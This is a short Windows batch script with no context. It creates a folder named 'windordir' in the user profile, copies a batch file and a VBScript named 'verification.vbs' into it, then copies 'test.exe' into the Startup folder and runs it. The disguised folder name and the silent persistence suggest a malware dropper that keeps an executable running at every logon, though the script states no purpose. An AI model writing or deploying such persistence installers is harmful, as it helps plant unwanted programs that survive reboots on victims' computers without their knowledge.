@echo off


mkdir "%userprofile%\windordir"

copy "sd.bat" "%userprofile%\windordir"

copy "verification.vbs" "%userprofile%\windordir"

copy "test.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 

start "" "test.exe"